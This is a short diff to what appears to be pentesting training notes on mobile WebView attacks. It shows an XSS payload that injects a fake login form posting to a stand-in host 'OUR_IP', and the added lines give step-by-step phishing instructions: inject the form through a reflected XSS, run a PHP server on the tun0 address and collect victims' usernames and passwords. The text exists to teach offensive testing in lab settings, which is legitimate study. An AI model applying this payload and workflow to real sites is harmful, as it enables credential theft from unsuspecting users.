@@ -399,5 +399,9 @@ In a mobile application, the app may sometimes use a WebView to embed a web appl
 3. `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`
 > (3) In this we are removing that feature in which we were hiding that fuction.
 
+- **Phisings steps**
+i. Find an RXSS vulnerability, then inject a login form as a payload, as shown in step (3). The payload should contain the IP of the server (which we can obtain by using the ip a command to find tun0). Then enter the payload (don't hit enter yet).
+ii. Run the server using this command: sudo php -S tun0_IP:80, then hit enter on the payload that we entered earlier.
+iii. Then observe — we will receive the username and password on the terminal.
 
 
